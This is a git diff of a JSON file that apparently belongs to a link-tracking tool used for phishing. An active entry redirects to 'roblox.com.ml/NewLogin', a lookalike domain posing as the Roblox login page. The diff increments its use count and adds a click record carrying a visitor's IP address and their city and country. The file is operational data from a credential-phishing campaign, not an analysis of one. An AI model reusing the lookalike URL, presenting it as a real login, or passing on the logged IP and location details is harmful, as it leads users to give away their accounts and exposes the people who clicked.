@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 621,
+    "useCount": 622,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5080,6 +5080,14 @@
         "city": "Naju",
         "flag": "🇰🇷",
         "countryCode": "KR"
+      },
+      {
+        "timestamp": 1777118478413,
+        "ip": "109.243.64.72",
+        "country": "Poland",
+        "city": "Warsaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
